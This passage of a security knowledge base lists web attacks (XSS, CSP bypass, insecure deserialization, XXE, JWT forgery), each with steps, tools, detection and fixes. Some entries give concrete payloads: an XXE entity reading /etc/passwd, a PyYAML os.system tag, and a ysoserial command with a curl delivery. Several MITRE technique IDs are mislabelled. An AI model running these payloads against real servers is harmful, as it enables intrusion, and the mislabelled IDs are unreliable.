- **Attack Steps**: Step 1: Review site’s CSP headers for allowed unsafe sources, inline scripts, or unsafe eval. Step 2: Identify script gadgets or allowed script URLs in CSP that can be abused. Step 3: Inject payloads leveraging allowed scripts or inline events to bypass CSP and run code. Step 4: Test CSP bypass payloads using Burp Suite or manual injection. Step 5: Observe if injected scripts run despite CSP. Step 6: Document weaknesses in CSP policy (e.g., unsafe-inline, unsafe-eval). Step 7: Educate on how CSP misconfigurations enable bypasses. Step 8: Suggest tightening CSP by removing unsafe directives and whitelisting only trusted domains. Step 9: Recommend nonce- or hash-based CSP for inline scripts. Step 10: Test CSP policies regularly with automated tools and update to fix bypasses.
- **Detection**: Analyze CSP headers and violations; detect inline script execution
- **Solution**: Use strict CSP with nonces/hashes; avoid unsafe directives; regular CSP audits
- **Tags**: XSS, CSP Bypass

## XSS via Third-Party Widgets or Plugins Injection

- **Attack Type**: Supply Chain / Third-Party XSS
- **Target**: Web applications
- **Vulnerability**: Vulnerabilities in third-party scripts
- **MITRE**: T1059.007 – Command Injection
- **Impact**: Site-wide XSS, data theft, defacement
- **Tools**: Browser Dev Tools, Burp
- **Scenario**: Third-party widget or plugin allows injection of malicious scripts into the site’s DOM.
- **Attack Steps**: Step 1: Identify third-party widgets/plugins integrated on the website (chat, analytics, ads). Step 2: Test for vulnerabilities or injection points in widget parameters or configurations. Step 3: Inject malicious scripts or payloads through widget inputs or URL parameters. Step 4: Observe if scripts execute inside the trusted domain context. Step 5: Check if compromised or malicious third-party scripts load attacker-controlled JS. Step 6: Use Burp Suite or browser dev tools to monitor network and DOM modifications. Step 7: Document widget/plugin causing XSS. Step 8: Suggest whitelisting trusted scripts only, sandboxing third-party iframes, or removing vulnerable widgets. Step 9: Keep all third-party plugins updated with security patches. Step 10: Monitor third-party content and set CSP to restrict external scripts.
- **Detection**: Monitor third-party requests; detect injection from external scripts
- **Solution**: Use trusted widgets; sandbox iframes; enforce strict CSP; patch plugins regularly
- **Tags**: XSS, Third-Party, Supply Chain

## PHP Object Injection via Untrusted Data

- **Attack Type**: Insecure Deserialization
- **Target**: PHP Web Apps
- **Vulnerability**: Untrusted PHP Object Deserialization
- **MITRE**: T1214 – Exploitation of PHP Unserialize
- **Impact**: Remote code execution, data disclosure
- **Tools**: Burp Suite, PHP Unserialize tools
- **Scenario**: An app unserializes PHP objects from user input without validation, enabling attacker to craft malicious objects for code exec
- **Attack Steps**: Step 1: Find an input (cookie, POST data, URL param) where PHP unserialize() is used on user data without checking. Step 2: Capture a normal serialized PHP object from the app. Step 3: Use online tools or PHP unserialize editors to craft a malicious serialized object payload with special PHP magic methods (e.g., __wakeup(), __destruct()) that execute system commands. Step 4: Inject this malicious payload in the vulnerable input (e.g., cookie or POST body). Step 5: When the server unserializes it, the magic method triggers, executing the attacker’s code (e.g., reading files, running shell commands). Step 6: Test by injecting simple payloads like system('id') or file reads. Step 7: Escalate to full remote code execution or data theft if successful. Step 8: Use Burp Suite to automate and intercept requests. Step 9: Document the vulnerable endpoint and payload. Step 10: Recommend patching by avoiding unserialize() on untrusted data or implementing allowlists.
- **Detection**: Monitor application logs for unserialize errors or suspicious requests
- **Solution**: Avoid unserialize on untrusted data; use JSON; implement allowlists for classes
- **Tags**: PHP, Deserialization, RCE

## Python Pickle File Tampering Leading to RCE

- **Attack Type**: Insecure Deserialization
- **Target**: Python Apps
- **Vulnerability**: Insecure Pickle Deserialization
- **MITRE**: T1214 – Exploitation of Python Pickle
- **Impact**: Remote code execution, system compromise
- **Tools**: Python Pickle, Burp Suite
- **Scenario**: Python app loads Pickle files from user input or uploads, allowing attacker to craft malicious pickle payloads for RCE
- **Attack Steps**: Step 1: Identify an app feature that loads or unpickles data from user uploads or API calls without validation. Step 2: Capture or understand the pickle format and which classes/functions are allowed. Step 3: Use Python pickle tools or write a script to craft a malicious pickle payload that executes arbitrary Python code upon unpickling (e.g., calls os.system('whoami')). Step 4: Upload or send the malicious pickle to the vulnerable endpoint. Step 5: The server unpickles the data and runs the malicious code embedded inside. Step 6: Confirm code execution by checking server response or effects (files created, commands run). Step 7: Automate with Burp Suite for testing multiple payloads. Step 8: Document the vulnerability and payload. Step 9: Educate to never unpickle untrusted data. Step 10: Suggest switching to safer serialization formats like JSON.
- **Detection**: Monitor server logs for unpickling errors or anomalies
- **Solution**: Disable untrusted pickle loading; prefer safe serialization formats
- **Tags**: Python, Deserialization, RCE

## Java readObject() Gadget Chain Exploitation

- **Attack Type**: Insecure Deserialization
- **Target**: Java Applications
- **Vulnerability**: Unsafe Java Deserialization
- **MITRE**: T1214 – Exploitation of Java Serialization
- **Impact**: Remote code execution, data leaks
- **Tools**: ysoserial, Burp Suite
- **Scenario**: Java apps deserialize untrusted data triggering gadget chains leading to remote code execution
- **Attack Steps**: Step 1: Find endpoints accepting serialized Java objects (e.g., cookies, POST data). Step 2: Understand app classpath to identify gadget chains (existing classes with dangerous deserialization behaviors). Step 3: Use tools like ysoserial to generate malicious Java serialized payloads leveraging gadget chains that run commands on deserialization. Step 4: Inject this payload in vulnerable input. Step 5: The server deserializes the object, triggering the gadget chain and executing attacker commands. Step 6: Confirm execution by observing server behavior or responses. Step 7: Try different gadget chains for better payloads. Step 8: Automate with Burp Suite to test. Step 9: Document vulnerable code paths and payloads. Step 10: Fix by disabling Java native deserialization on untrusted data or using allowlists.
- **Detection**: Analyze logs for deserialization errors; detect abnormal activity
- **Solution**: Disable default Java deserialization; apply allowlists or safer libraries
- **Tags**: Java, Deserialization, RCE

## Serialized Cookie Tampering for Privilege Escalation

- **Attack Type**: Serialized Cookie Manipulation
- **Target**: Web Sessions
- **Vulnerability**: Unprotected Serialized Cookies
- **MITRE**: T1078 – Valid Accounts
- **Impact**: Privilege escalation, account takeover
- **Tools**: Burp Suite, Cookie Editors
- **Scenario**: Apps store user session or role data as serialized objects in cookies; attacker modifies them to escalate privileges
- **Attack Steps**: Step 1: Identify cookies that contain serialized or encoded user session data (e.g., roles, user IDs). Step 2: Decode or unserialize the cookie data locally to understand structure. Step 3: Modify fields such as is_admin from false to true or user_id to another user. Step 4: Re-serialize and re-encode the cookie properly. Step 5: Replace cookie in the browser or request with modified one. Step 6: Refresh the session or make authenticated requests. Step 7: If server trusts cookie blindly, attacker gains escalated privileges (admin, other user access). Step 8: Use Burp Suite's cookie editor or plugins for automation. Step 9: Document vulnerable cookies and successful privilege escalation. Step 10: Recommend signing and encrypting cookies or using server-side session management.
- **Detection**: Monitor for invalid cookie tampering; detect role changes
- **Solution**: Sign/encrypt cookies; store session data server-side; validate server-side session
- **Tags**: Cookie Manipulation, Session Attacks

## Insecure Deserialization in REST APIs

- **Attack Type**: REST API Insecure Deserialization
- **Target**: REST APIs
- **Vulnerability**: Insecure Deserialization
- **MITRE**: T1214 – Exploitation of Insecure Deserialization
- **Impact**: Data theft, RCE, privilege escalation
- **Tools**: Postman, Burp Suite, JSON Tools
- **Scenario**: REST APIs accept serialized JSON/XML/other data that when deserialized insecurely allow attacks
- **Attack Steps**: Step 1: Identify REST API endpoints that accept serialized or complex JSON/XML input. Step 2: Understand how server deserializes input (e.g., Java ObjectMapper, Python pickle JSON). Step 3: Craft malicious serialized payloads or JSON with extra fields or type-hints triggering dangerous behavior or code execution on deserialization. Step 4: Send payloads via API requests. Step 5: Server deserializes input and executes unintended code or accesses sensitive info. Step 6: Check API responses and server behavior for confirmation. Step 7: Automate testing with Postman or Burp Suite. Step 8: Document API endpoint vulnerabilities and payloads. Step 9: Educate developers on safe deserialization techniques. Step 10: Recommend input validation, use of safe serialization libraries, and strict schema validation.
- **Detection**: Monitor API logs for malformed deserialization errors or anomalies
- **Solution**: Validate input schema strictly; avoid unsafe deserialization; use allowlists
- **Tags**: API Security, Deserialization

## Deserialization of Unsanitized JSON Data

- **Attack Type**: Insecure JSON Deserialization
- **Target**: REST APIs
- **Vulnerability**: Unsanitized JSON Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, data leak
- **Tools**: Postman, Burp Suite, JSON tools
- **Scenario**: Web app parses JSON data from untrusted sources without validation, allowing injection of dangerous types or properties
- **Attack Steps**: Step 1: Identify an API or input field accepting JSON data that is parsed server-side without strict schema validation. Step 2: Send normal JSON requests and observe app responses to understand data structure. Step 3: Craft JSON with additional unexpected fields or special types that could cause deserialization issues (e.g., Java polymorphic types or Python object references). Step 4: Send malicious JSON that exploits deserialization to trigger code execution or data access (e.g., injecting __type__ or $type fields in Java). Step 5: Monitor server behavior, error messages, or output to confirm successful exploitation. Step 6: Automate with Burp Suite to fuzz and send variations of JSON payloads. Step 7: Document vulnerable endpoints and payloads. Step 8: Report findings and recommend strict input validation and disabling polymorphic deserialization.
- **Detection**: Detect abnormal JSON payloads or errors in logs
- **Solution**: Use strict JSON schemas; disable polymorphic deserialization features; sanitize inputs
- **Tags**: JSON, Deserialization

## XML External Entity (XXE) Injection via Deserialization

- **Attack Type**: XML Deserialization Vulnerability
- **Target**: Web APIs
- **Vulnerability**: XML External Entity Injection
- **MITRE**: T1220 – XML External Entities (XXE)
- **Impact**: Data disclosure, DoS, server takeover
- **Tools**: Burp Suite, XML Tools
- **Scenario**: Application deserializes XML from untrusted sources; attacker uses XXE to read files or cause DoS
- **Attack Steps**: Step 1: Find an endpoint accepting XML data input (e.g., SOAP, REST with XML). Step 2: Send a normal XML request and observe the response to verify parsing. Step 3: Craft malicious XML containing an external entity declaration (e.g., <!ENTITY xxe SYSTEM "file:///etc/passwd">). Step 4: Reference the entity in the XML body so that when parsed, the server tries to read and include the external resource content. Step 5: Send the crafted XML to the server. Step 6: If vulnerable, server includes contents of the external file in its response or logs. Step 7: Escalate to further attacks such as SSRF or DoS using large files or recursive entities. Step 8: Automate tests with Burp Suite or XXEinjector tools. Step 9: Document vulnerable endpoints and exploit details. Step 10: Recommend disabling external entity processing or using secure XML parsers.
- **Detection**: Monitor XML parsing errors and unexpected outbound requests
- **Solution**: Disable external entities; use safe XML parser libraries; validate input thoroughly
- **Tags**: XML, XXE, Deserialization

## YAML Deserialization Leading to Arbitrary Code Execution

- **Attack Type**: Insecure YAML Deserialization
- **Target**: Web APIs
- **Vulnerability**: Unsafe YAML Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, system compromise
- **Tools**: YAML parsers, Burp Suite
- **Scenario**: YAML parser loads untrusted YAML input which can include code execution payloads
- **Attack Steps**: Step 1: Identify an app feature parsing YAML input (API, config upload, etc.) without sanitizing or restricting classes. Step 2: Understand the YAML structure and the parser in use (e.g., PyYAML, Ruby Psych). Step 3: Craft a malicious YAML payload containing references to special classes or functions (e.g., !!python/object/apply:os.system ['id']). Step 4: Submit the YAML payload to the vulnerable endpoint. Step 5: The parser deserializes the YAML and triggers the embedded command execution. Step 6: Observe server responses or side effects to confirm RCE (remote code execution). Step 7: Use Burp Suite to automate and test multiple payloads. Step 8: Document vulnerable parsers and endpoints. Step 9: Recommend disabling unsafe load functions (e.g., use safe_load in PyYAML). Step 10: Educate developers about YAML security best practices.
- **Detection**: Log YAML parsing errors or suspicious commands execution
- **Solution**: Use safe YAML loading methods; restrict allowed classes; validate input
- **Tags**: YAML, Deserialization

## Unsafe Deserialization in .NET BinaryFormatter

- **Attack Type**: Remote Code Execution via Deserialization
- **Target**: .NET Web APIs, Desktop Apps
- **Vulnerability**: Unsafe deserialization of untrusted input
- **MITRE**: T1211 / T1059 – Exploitation via Deserialization
- **Impact**: Remote code execution, server compromise
- **Tools**: Visual Studio (.NET Framework runtime), ysoserial.net, curl/Postman
- **Scenario**: A .NET application (e.g., ASP.NET, web API, desktop app) deserializes user-supplied binary data using BinaryFormatter.Deserialize, allowing attackers to craft malicious payloads that execute code in the target process.
- **Attack Steps**: Step 1: Attacker identifies a .NET endpoint or input (e.g., file upload, HTTP body, cookie) processed with BinaryFormatter.Deserialize, often visible in open-source code or via error messages. Step 2: They craft a malicious object graph using ysoserial.net, choosing a gadget chain (e.g., TypeConfuseDelegate) that, when deserialized, will execute a command such as cmd.exe /C calc.exe. Step 3: Using the tool: ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd.exe /C calc" they generate a payload in binary form. Step 4: The payload is encoded (e.g., base64), then sent to the target endpoint, e.g., via curl -X POST https://target/app/api -d '{"data":"<payload>"}'. Step 5: The server receives data, calls BinaryFormatter.Deserialize, interprets the payload, and inside the gadget chain triggers Process.Start("calc.exe") or other commands. Step 6: The attacker confirms code execution by observing the side effect (e.g., application crash, creation of a file, spawn of calc.exe). Step 7: They escalate access or drop a reverse shell payload as needed. Step 8: The attack bypasses any type-binding restrictions unless a strict SerializationBinder is used. Step 9: The exploit works across .NET Framework and Core (pre-5.0), and developers are still warned not to use BinaryFormatter with untrusted input (learn.microsoft.com, james-joseph.medium.com, modzero.com, medium.com).
- **Detection**: Scan for uses of BinaryFormatter.Deserialize; logging of unexpected types or commands
- **Solution**: Replace with JSON/XML serializers, whitelist types via SerializationBinder, or use secure formats like System.Text.Json, protobuf
- **Tags**: .NET Deserialization, BinaryFormatter, Gadget Chains

## Deserialization Attacks via Apache Commons Collections Gadget

- **Attack Type**: Java Deserialization Gadget Chain
- **Target**: Java Web Apps
- **Vulnerability**: Unsafe Java Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote Code Execution, Server Takeover
- **Tools**: ysoserial, Burp Suite, Java tools
- **Scenario**: Java apps using Apache Commons Collections deserialize untrusted data. Attackers craft malicious payloads exploiting gadget chains to achieve Remote Code Execution (RCE).
- **Attack Steps**: Step 1: Identify a Java-based web app endpoint that accepts serialized Java objects (e.g., session tokens, serialized JSON). Step 2: Confirm the app uses Apache Commons Collections (usually by analyzing app dependencies or error messages). Step 3: Use ysoserial tool to generate a malicious payload exploiting the Commons Collections gadget chain that triggers command execution (e.g., calc.exe on Windows, or id on Linux). Step 4: Send the crafted payload to the vulnerable endpoint via POST or serialized input field. Step 5: The server deserializes the payload, executing embedded commands on the server side. Step 6: Confirm successful exploitation by observing server behavior or command outputs in responses or logs. Step 7: Optionally, automate fuzzing for other vulnerable endpoints. Step 8: Document affected components and report. Step 9: Recommend upgrading libraries, disabling unsafe deserialization, or enforcing input validation.
- **Detection**: Monitor deserialization errors and unusual system calls
- **Solution**: Upgrade Apache Commons Collections; disable Java native deserialization; use safe serialization libraries
- **Tags**: Java, Commons Collections, RCE

## Remote Code Execution via Java Spring Deserialization

- **Attack Type**: Java Spring Deserialization
- **Target**: Java Spring Applications
- **Vulnerability**: Unsafe Java Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote Code Execution, Data Leak
- **Tools**: ysoserial, Burp Suite
- **Scenario**: Spring framework apps deserialize untrusted inputs allowing attackers to execute arbitrary code via crafted serialized payloads.
- **Attack Steps**: Step 1: Identify a Spring app endpoint accepting serialized Java objects or Spring sessions. Step 2: Verify the app deserializes these objects without validation. Step 3: Use ysoserial with a Spring-compatible gadget chain to create malicious serialized payloads (e.g., invoking Runtime.exec()). Step 4: Send the payload to the endpoint through POST data, headers, or cookies. Step 5: Server deserializes and runs commands embedded in the payload. Step 6: Confirm code execution via response changes, server logs, or triggered side effects. Step 7: Perform repeated tests to identify all vulnerable endpoints. Step 8: Record findings and recommend use of safe serialization, upgrading Spring versions, or disabling native deserialization. Step 9: Educate developers on deserialization risks in Spring.
- **Detection**: Log monitoring for deserialization exceptions and suspicious commands
- **Solution**: Disable native Java serialization in Spring; use JSON/XML serialization with validation
- **Tags**: Java, Spring, RCE

## Deserialization-based SSRF through Crafted Payloads

- **Attack Type**: SSRF via Deserialization
- **Target**: Web Apps, APIs
- **Vulnerability**: Unsafe Deserialization triggering SSRF
- **MITRE**: T1214 + T1189 (SSRF)
- **Impact**: Internal network exposure, data leakage
- **Tools**: Burp Suite, Custom payload builders
- **Scenario**: Attackers craft serialized objects that, when deserialized, cause the server to make HTTP requests to internal or external systems, enabling SSRF attacks.
- **Attack Steps**: Step 1: Identify endpoints accepting serialized objects that contain URL or network call parameters. Step 2: Analyze deserialization logic to check if server-side code triggers network calls based on object data. Step 3: Craft serialized payloads with malicious URLs or internal IP addresses (e.g., http://localhost/admin). Step 4: Send the crafted payload to the server. Step 5: Upon deserialization, the server executes the network call embedded in the payload. Step 6: This can expose internal services or data otherwise not reachable from outside. Step 7: Monitor server logs or responses for evidence of SSRF. Step 8: Test various URLs and protocols to map internal network. Step 9: Recommend strict validation on deserialized objects and restrict outgoing server requests.
- **Detection**: Monitor outbound network calls; detect unexpected internal requests
- **Solution**: Validate and sanitize deserialized input; restrict outbound requests from server
- **Tags**: SSRF, Deserialization

## Insecure Deserialization in Message Queues (e.g., RabbitMQ)

- **Attack Type**: Deserialization in MQ Systems
- **Target**: Message Queue Consumers
- **Vulnerability**: Insecure Message Queue Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote Code Execution, Message Queue Compromise
- **Tools**: RabbitMQ client tools, Burp Suite
- **Scenario**: Message queues accept serialized messages without validation, allowing malicious deserialization leading to code execution or system compromise.
- **Attack Steps**: Step 1: Identify message queue (RabbitMQ, ActiveMQ) consumers accepting serialized messages. Step 2: Capture or craft serialized message payloads that will be deserialized by the consumer. Step 3: Use known gadget chains or tools like ysoserial to create malicious serialized payloads targeting the queue consumers. Step 4: Publish the malicious message to the message queue. Step 5: When the consumer reads and deserializes the message, it executes the embedded commands. Step 6: Monitor the consumer behavior, logs, or side effects to confirm exploitation. Step 7: Repeat testing with different payloads or queues. Step 8: Document all vulnerable consumers. Step 9: Recommend validating messages before deserialization and using safer serialization formats.
- **Detection**: Monitor message queue logs and system behavior
- **Solution**: Use JSON or safer serialization; validate message contents before deserialization
- **Tags**: MQ, RabbitMQ, Deserialization

## Deserialization in Serverless Functions Leading to RCE

- **Attack Type**: Serverless Function Deserialization
- **Target**: Serverless Functions
- **Vulnerability**: Unsafe Deserialization in Serverless Functions
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote Code Execution, Cloud Resource Compromise
- **Tools**: AWS CLI, Azure Portal, Burp Suite
- **Scenario**: Serverless functions (AWS Lambda, Azure Functions) deserialize untrusted input data without validation, leading to remote code execution.
- **Attack Steps**: Step 1: Identify serverless functions accepting serialized data (payloads, events). Step 2: Review code or behavior to check if deserialization is performed without validation. Step 3: Generate malicious serialized payloads using gadgets or code execution payloads compatible with the serverless runtime (Java, Python, Node.js). Step 4: Invoke the serverless function with the malicious payload. Step 5: The function deserializes the input and executes the malicious code, potentially gaining access to cloud resources or data. Step 6: Observe logs, cloud dashboards, or response outputs for confirmation. Step 7: Test all serverless endpoints to find additional vulnerable functions. Step 8: Document the attack surface and payloads used. Step 9: Advise input validation, principle of least privilege, and use of safe serialization formats in serverless functions.
- **Detection**: Monitor cloud function logs and unexpected behavior
- **Solution**: Validate inputs strictly; use safe deserialization; apply least privilege permissions on functions
- **Tags**: Serverless, AWS Lambda, RCE

## Insecure Deserialization in Mobile App Backends

- **Attack Type**: Backend Deserialization Exploit
- **Target**: Mobile App Backends
- **Vulnerability**: Unsafe Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, authentication bypass
- **Tools**: Burp Suite, Frida, Postman
- **Scenario**: Mobile apps send serialized data (JSON, binary) to backend servers which deserialize without validation, enabling attackers to run malicious code or bypass auth.
- **Attack Steps**: Step 1: Identify the mobile app backend API endpoints that accept serialized or encoded data (JSON, Protobuf, XML). Step 2: Use a proxy tool (e.g., Burp Suite) to intercept and capture the serialized data sent from the app to the backend. Step 3: Analyze the serialized data structure and note any parameters that look like serialized objects or tokens. Step 4: Attempt to modify these serialized objects with malicious payloads, such as changing roles or adding code if possible. Step 5: Send the modified payload back to the server via the intercepted request. Step 6: If the server deserializes without validation, it may execute the malicious code or grant unauthorized access. Step 7: Confirm exploit success by checking the app’s response or by observing unauthorized access to backend features. Step 8: Report findings and recommend input validation and secure deserialization libraries.
- **Detection**: Monitor unexpected API requests and backend errors
- **Solution**: Validate and sanitize input; avoid native deserialization; use safe parsers
- **Tags**: Mobile, Backend, API, Deserialization

## Deserialization of Malicious JWT Tokens

- **Attack Type**: JWT Token Tampering
- **Target**: Web / Mobile Apps
- **Vulnerability**: JWT Weak Signing or None Algorithm
- **MITRE**: T1550 – Use of Valid Credentials
- **Impact**: Privilege escalation, token forgery
- **Tools**: JWT.io debugger, Burp Suite
- **Scenario**: JWT tokens with weak signing or "none" algorithm can be modified by attackers to escalate privileges or impersonate users during deserialization and verification.
- **Attack Steps**: Step 1: Identify the application uses JWT tokens for authentication and check token algorithm (HS256, RS256, or none). Step 2: Capture a valid JWT token from the app or web app using a proxy. Step 3: Decode the JWT token payload using online tools or JWT libraries. Step 4: Modify claims inside the token, e.g., change "role": "user" to "role": "admin". Step 5: If the token uses "alg": "none" or weak keys, attackers can resign the token with "alg": "none" or a guess key. Step 6: Resend the modified JWT token with the altered payload to the server in the authorization header or cookie. Step 7: If the server does not properly verify the signature or algorithm, it accepts the token as valid and grants elevated privileges. Step 8: Confirm access escalation by trying admin-only actions in the app. Step 9: Report and advise use of strong signing algorithms and strict verification.
- **Detection**: Log failed or unusual token verification attempts
- **Solution**: Use strong signing algorithms (RS256), enforce signature checks
- **Tags**: JWT, Token Forgery, Auth

## Use of Gadget Chains in Deserialization for Privilege Escalation

- **Attack Type**: Gadget Chain Exploit
- **Target**: Web Applications
- **Vulnerability**: Gadget Chain in Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Privilege escalation, RCE
- **Tools**: ysoserial, Burp Suite
- **Scenario**: Attackers use known vulnerable classes (“gadgets”) in application libraries to chain method calls and escalate privileges during deserialization.
- **Attack Steps**: Step 1: Identify application language and libraries in use (Java, Python, PHP, etc.). Step 2: Research known gadget chains in those libraries (e.g., Apache Commons Collections for Java). Step 3: Use tools like ysoserial to generate malicious payloads that exploit these chains to run code on the server. Step 4: Send the crafted serialized payload to the vulnerable deserialization endpoint. Step 5: Upon deserialization, the gadget chain triggers a sequence of method calls leading to command execution or privilege escalation. Step 6: Validate successful execution by observing responses or system effects (e.g., file creation, command output). Step 7: Repeat for other endpoints or libraries. Step 8: Suggest removing vulnerable libraries, updating dependencies, or blocking unsafe deserialization.
- **Detection**: Monitor deserialization exceptions and unusual commands
- **Solution**: Update libraries; use safe deserialization; disable native deserialization
- **Tags**: Gadget Chain, Privilege Escalation

## Deserialization of Untrusted XML leading to Blind XXE

- **Attack Type**: XML External Entity (XXE) via Deserialization
- **Target**: Web Applications
- **Vulnerability**: XML External Entity (XXE) Injection
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Sensitive data disclosure, SSRF
- **Tools**: Burp Suite, XXE scanners
- **Scenario**: Applications that deserialize XML without proper protections can allow attackers to inject external entity references, leading to sensitive file read or SSRF.
- **Attack Steps**: Step 1: Locate XML input endpoints that deserialize XML payloads from users or APIs. Step 2: Intercept an XML payload sent to the server. Step 3: Modify the XML to include an external entity declaration referencing local files or remote URLs, e.g., <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>. Step 4: Insert the external entity &xxe; inside the XML data where it will be parsed. Step 5: Send the malicious XML to the server. Step 6: If the server does not disable external entity resolution, it fetches or reads the referenced files or URLs. Step 7: In blind XXE, attacker may not get direct response but can cause side effects (DNS lookups to attacker server). Step 8: Confirm via network logs or out-of-band interaction. Step 9: Recommend disabling external entities in XML parsers and validating XML input.
- **Detection**: Monitor DNS logs, outbound connections; XML parsing errors
- **Solution**: Disable external entities; use secure XML parsers; validate input
- **Tags**: XXE, XML Deserialization

## Deserialization Attacks via Unsafe Object Graphs

- **Attack Type**: Unsafe Object Graph Deserialization
- **Target**: Web & Mobile Apps
- **Vulnerability**: Unsafe Object Graph Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Privilege escalation, code execution
- **Tools**: Burp Suite, Custom serializers
- **Scenario**: Attackers craft complex object graphs that exploit application logic or constructors during deserialization to escalate privileges or trigger code execution.
- **Attack Steps**: Step 1: Understand the object graph structure expected by the deserialization logic in the app. Step 2: Intercept serialized data representing object graphs (e.g., nested objects, arrays). Step 3: Modify or inject crafted object graphs that include malicious objects or override methods like __wakeup(), __destruct() in PHP or constructors in Java. Step 4: Send the malicious serialized object graph to the vulnerable endpoint. Step 5: During deserialization, these objects invoke malicious code or bypass authorization logic (e.g., setting isAdmin=true). Step 6: Confirm success by accessing restricted areas or seeing code execution effects. Step 7: Test with multiple variants of object graphs to identify all vulnerable deserialization paths. Step 8: Recommend strict input validation, disabling dangerous magic methods, and using safe deserialization libraries.
- **Detection**: Log anomalous deserialization calls and unauthorized actions
- **Solution**: Use secure serialization formats; avoid unserializing untrusted data; disable magic methods where possible
- **Tags**: Object Graph, Privilege Escalation

## Insecure Deserialization in Microservices Communication

- **Attack Type**: Insecure Deserialization
- **Target**: Microservices
- **Vulnerability**: Insecure Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, privilege escalation
- **Tools**: Burp Suite, Postman, Wireshark
- **Scenario**: Microservices exchange serialized data (JSON, binary). If one service blindly deserializes data from others, attackers can exploit it to run malicious code or escalate privileges.
- **Attack Steps**: Step 1: Identify microservices that communicate by sending serialized data payloads (JSON, Protobuf, XML). Step 2: Intercept or replicate such communications with a proxy or API client. Step 3: Analyze the serialized data structure exchanged between microservices. Step 4: Craft malicious serialized payloads that include unexpected or dangerous objects designed to exploit insecure deserialization in the target service. Step 5: Send the malicious payload to the microservice endpoint pretending to be another trusted service. Step 6: If the target microservice does not properly validate or sanitize input before deserialization, it will execute unintended commands or escalate privileges. Step 7: Verify the attack success by checking for unauthorized actions, logs, or system changes. Step 8: Repeat with different payloads or endpoints to explore other weaknesses. Step 9: Recommend securing inter-service communication with strict validation, authentication, and safe serialization libraries.
- **Detection**: Monitor inter-service traffic for anomalies and deserialization errors
- **Solution**: Use signed/encrypted messages; validate input; avoid native deserialization
- **Tags**: Microservices, API, Serialization

## Exploiting Deserialization via Custom Serialization Implementations

- **Attack Type**: Custom Serialization Exploit
- **Target**: Web Applications
- **Vulnerability**: Weak Custom Serialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Code execution, privilege escalation
- **Tools**: Burp Suite, Custom scripts
- **Scenario**: Custom serialization code may be insecure if it does not properly check input, allowing attackers to send crafted objects that cause code execution or logic flaws.
- **Attack Steps**: Step 1: Identify if the application uses custom code to serialize/deserialize data instead of standard libraries. Step 2: Review or analyze the custom serialization format or code (if source code or behavior known). Step 3: Capture serialized payloads sent to the application. Step 4: Craft malicious payloads tailored to the custom serialization format, injecting dangerous object types or values that can bypass normal checks. Step 5: Send the malicious payload to the vulnerable endpoint using a proxy or script. Step 6: If the custom deserialization does not validate input correctly, the payload triggers unexpected behaviors such as executing system commands or bypassing authentication. Step 7: Check the application response or system logs for success confirmation. Step 8: Suggest code review, input validation, and replacing unsafe custom serialization with well-tested standard libraries.
- **Detection**: Log unusual input processing; monitor system commands
- **Solution**: Replace custom serialization with secure libraries; validate inputs
- **Tags**: Custom Serialization, Code Review

## Deserialization Attacks on Distributed Cache (e.g., Redis, Memcached)

- **Attack Type**: Cache Deserialization Exploit
- **Target**: Distributed Cache Systems
- **Vulnerability**: Unsafe Cache Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, data manipulation
- **Tools**: Redis CLI, Memcached tools, Burp
- **Scenario**: Distributed caches often store serialized objects. If they accept untrusted data without validation, attackers can poison cache with malicious payloads triggering code execution.
- **Attack Steps**: Step 1: Identify if the application uses distributed caches like Redis or Memcached to store serialized objects. Step 2: Find if external or untrusted sources can write to the cache keys or values. Step 3: Craft malicious serialized objects designed to exploit unsafe deserialization when the cache is read back by the application. Step 4: Insert the malicious serialized payload into the cache using available interfaces or injection vectors. Step 5: When the application reads and deserializes this data from the cache, it executes malicious code or escalates privileges. Step 6: Verify success by observing unexpected behavior or elevated access. Step 7: Repeat with different payloads to explore all cache-related vectors. Step 8: Recommend cache input validation, secure serialization, and restricting cache write access only to trusted components.
- **Detection**: Monitor cache writes for unusual data; audit access controls
- **Solution**: Use trusted serialization; restrict cache writes; validate deserialized data
- **Tags**: Cache Poisoning, Deserialization

## Deserialization of Untrusted YAML in CI/CD Pipelines

- **Attack Type**: Unsafe YAML Deserialization
- **Target**: CI/CD Systems
- **Vulnerability**: Unsafe YAML Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, pipeline compromise
- **Tools**: CI tools (Jenkins, GitLab), Burp
- **Scenario**: CI/CD tools parse YAML configs for deployment automation. Attackers inject malicious YAML payloads that exploit unsafe deserialization to run arbitrary commands on build servers.
- **Attack Steps**: Step 1: Identify CI/CD pipeline steps that parse YAML configuration files or input. Step 2: Intercept or submit modified YAML files or parameters to the pipeline. Step 3: Inject malicious YAML payloads that exploit unsafe deserialization features, e.g., by including aliases or tags that trigger execution (e.g., !!python/object/apply:os.system). Step 4: Commit or send the malicious YAML to the pipeline’s source repository or API. Step 5: When the CI/CD system parses the YAML, it triggers malicious system commands or scripts embedded in the YAML payload. Step 6: Verify by observing pipeline output logs or system behavior. Step 7: Repeat with different payloads or pipeline stages to assess full impact. Step 8: Recommend disabling unsafe YAML tags, strict input validation, and pipeline environment isolation.
- **Detection**: Monitor pipeline logs; detect unusual commands
- **Solution**: Disable unsafe YAML tags; validate configs; isolate build environments
- **Tags**: CI/CD, YAML, Pipeline Security

## Deserialization-based Lateral Movement in Cloud Environments

- **Attack Type**: Deserialization for Lateral Movement
- **Target**: Cloud Environments
- **Vulnerability**: Insecure Deserialization
- **MITRE**: T1214, T1075 – Lateral Movement
- **Impact**: Escalated privileges, expanded breach
- **Tools**: Cloud CLI, Burp Suite, AWS Tools
